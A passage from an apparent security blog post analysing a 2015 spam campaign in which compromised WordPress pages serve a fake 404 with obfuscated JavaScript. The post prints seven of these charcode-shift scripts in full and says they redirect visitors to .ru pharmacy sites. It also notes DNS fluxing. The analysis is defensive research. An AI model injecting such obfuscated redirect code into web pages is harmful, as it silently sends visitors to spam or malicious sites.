text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language en-US,en;q=0.5\nAccept-Encoding gzip, deflate\nConnection keep-alive\n\n(Status-Line) HTTP/1.1 404 Not Found\nServer nginx\nDate Tue, 29 Sep 2015 19:32:40 GMT\nContent-Type text/html\nTransfer-Encoding chunked\nConnection keep-alive\nVary Accept-Encoding\nX-Powered-By PHP/5.4.44\nContent-Encoding gzip\n\nIf you see the highlighted part in the HTTP response headers, it shows \"404 Not Found\" error which generally means resource does not exist on the web server. Infact it is not true, the web server responded back with following content as a part of web page.\n\n\n\n\n\n\n\n\nBefore going further, check our earlier articles on JavaScript de-obfuscation\n\n\n\nhttp://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-1.html\nhttp://secniche.blogspot.com/2012/04/javascript-obfuscation-manual-armor-2.html\nhttp://secniche.blogspot.com/2011/04/javascript-camouflaging-primer.html \n\n\n\nIf you notice, the web page has an obfuscated JavaScript embedded in it. Let\'s extract the obfuscated JavaScript as shown below:\n\n\n\n\n\n\n\n\n\nThe obfuscated JS is not that complex and it can be de-obfuscated easily. On de-obfuscation it was observed that the user\'s browser was further redirected to the following domain: \"hxxp://magicorganicmarket.ru\" as shown below:\n\n\n\n\n\n\n\n\n\nDue to misconfiguration on the landing domain:\"hxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/educating.php\" , the directory listing was obtained as follows:\n\n\n\n\n\n\n\n\n\n\nSeveral other malicious links with obfuscated JavaScripts were obtained and presented as follows:\n\n \n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/chatterer.php\n\n\n\nfunction celle() { cella=72; cellb=[191,177,182,172,183,191,118,188,183,184,118,180,183,171,169,188,177,183,182,118,176,186,173,174,133,111,176,188,188,184,130,119,119,182,169,188,189,186,169,180,176,173,186,170,187,183,189,188,180,173,188,118,186,189,111,131]; cellc=\"\"; for(celld=0;celld<cellb.length;celld++) { cellc+=String.fromCharCode(cellb[celld]-cella); } return cellc; } setTimeout(celle(),1306);\n\n\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://naturalherbsoutlet.ru/\n\n\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/elimination.php\n\n\n\nfunction sicklee() { sicklea=42; sickleb=[161,147,152,142,153,161,88,158,153,154,88,150,153,141,139,158,147,153,152,88,146,156,143,144,103,81,146,158,158,154,100,89,89,145,143,152,143,156,147,141,139,147,142,141,153,151,154,139,152,163,88,156,159,81,101]; sicklec=\"\"; for(sickled=0;sickled<sickleb.length;sickled++) { sicklec+=String.fromCharCode(sickleb[sickled]-sicklea); } return sicklec; } setTimeout(sicklee(),1276);\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://genericaidcompany.ru/\n\n \n\n \n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/fresnel.php\n\n\n\nfunction timee() { timea=58; timeb=[177,163,168,158,169,177,104,174,169,170,104,166,169,157,155,174,163,169,168,104,162,172,159,160,119,97,162,174,174,170,116,105,105,167,159,158,163,157,155,166,173,155,160,159,173,159,172,176,163,157,159,173,104,172,175,97,117]; timec=\"\"; for(timed=0;timed<timeb.length;timed++) { timec+=String.fromCharCode(timeb[timed]-timea); } return timec; } setTimeout(timee(),1292);\n\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://medicalsafeservices.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/js/sensitive.php\n\n\n\nfunction risee() { risea=80; riseb=[199,185,190,180,191,199,126,196,191,192,126,188,191,179,177,196,185,191,190,126,184,194,181,182,141,119,184,196,196,192,138,127,127,192,181,194,182,181,179,196,184,181,194,178,195,199,181,178,189,177,194,196,126,194,197,119,139]; risec=\"\"; for(rised=0;rised<riseb.length;rised++) { risec+=String.fromCharCode(riseb[rised]-risea); } return risec; } setTimeout(risee(),1314);\nOnline Pharmacy Website after De-obfuscating JS Code: hxxp://perfectherbswebmart.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\n\n\nfunction likede() { likeda=62; likedb=[181,167,172,162,173,181,108,178,173,174,108,170,173,161,159,178,167,173,172,108,166,176,163,164,123,101,166,178,178,174,120,109,109,173,172,170,167,172,163,176,163,171,163,162,183,180,159,170,179,163,108,176,179,101,121]; likedc=\"\"; for(likedd=0;likedd<likedb.length;likedd++) { likedc+=String.fromCharCode(likedb[likedd]-likeda); } return likedc; } setTimeout(likede(),1296);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://onlineremedyvalue.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\nfunction politye() { politya=38; polityb=[157,143,148,138,149,157,84,154,149,150,84,146,149,137,135,154,143,149,148,84,142,152,139,140,99,77,142,154,154,150,96,85,85,148,135,154,155,152,135,146,150,143,146,146,147,135,146,146,84,152,155,77,97]; polityc=\"\"; for(polityd=0;polityd<polityb.length;polityd++) { polityc+=String.fromCharCode(polityb[polityd]-politya); } return polityc; } setTimeout(politye(),1272);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://naturalpillmall.ru/\n\n\n\nhxxp://pasarjagakarsa.com/wp-content/themes/eStore/epanel/page_templates/reclaimers.php\n\nfunction travellere() { travellera=56; travellerb=[175,161,166,156,167,175,102,172,167,168,102,164,167,155,153,172,161,167,166,102,160,170,157,158,117,95,160,172,172,168,114,103,103,160,157,170,154,153,164,160,167,172,168,173,170,155,160,153,171,157,102,170,173,95,115]; travellerc=\"\"; for(travellerd=0;travellerd<travellerb.length;travellerd++) { travellerc+=String.fromCharCode(travellerb[travellerd]-travellera); } return travellerc; } setTimeout(travellere(),1290);\n Online Pharmacy Website after De-obfuscating JS Code: hxxp://herbalhotpurchase.ru/\n[Updates]\n\n\nAll the information and orders are actually handled by this primary outlet - hxxps://checkoutucxefvfq.fastcheckoutrx.com/\n\n\n\n\n\n\n\nWe performed tests at the network level to understand on how the name servers were configured and we found that DNS fluxing was used in this campaign. The Time-To-Live (TTL) field is set for 600 seconds and after the IP address of the domain changes. \n\n\n\nHere is an example:\n\n\n\nperfectherbswebmart.ru. 600 IN A 82.199.121.167\n\nperfectherbswebmart.ru. 600 IN A 198.144.158.52\n\n\n\nSome analytical points for consideration:\n\n\n\nOverall extensive \".ru\" domains have been used in this spamming campaign.\nOne can conclude that automated spam-code generation tools have been used in this campaign to ease out the process of large scale infection\n\nFor example:- infecting PHP pages with JavaScript obfuscated code hosted on the compromised websites\n\nThe campaign looks like to be executed at an extensive level considering the artefacts.\n\nMany similar instances of JavaScript obfuscation have been analyzed as presented above\nA number of online pharmacy websites found after de-obfuscating the JavaScript:\n\nhxxp://herbalhotpurchase.ru/\nhxxp://naturalpillmall.ru/\nhxxp://onlineremedyvalue.ru/\nhxxp://perfectherbswebmart.ru/\nhxxp://medicalsafeservices.ru/\nhxxp://genericaidcompany.ru/\nhxxp://naturalherbsoutlet.ru/\n\n\n\n\nWe believe that this is just the tip of the iceberg and there will be many more\n\n\nWe won\'t be surprised if the same tactics are used for drive-by download instead of spamming in particular.\n\n\n\nNote: At the time of drafting this post, all the websites were active.\n\nStay Secure !', 'Cybercrime, Malware Obfuscation, Whats App', 'https://secniche.blogspot.com/2015/09/nurturing-javascript-obfuscation-whats.html\n');
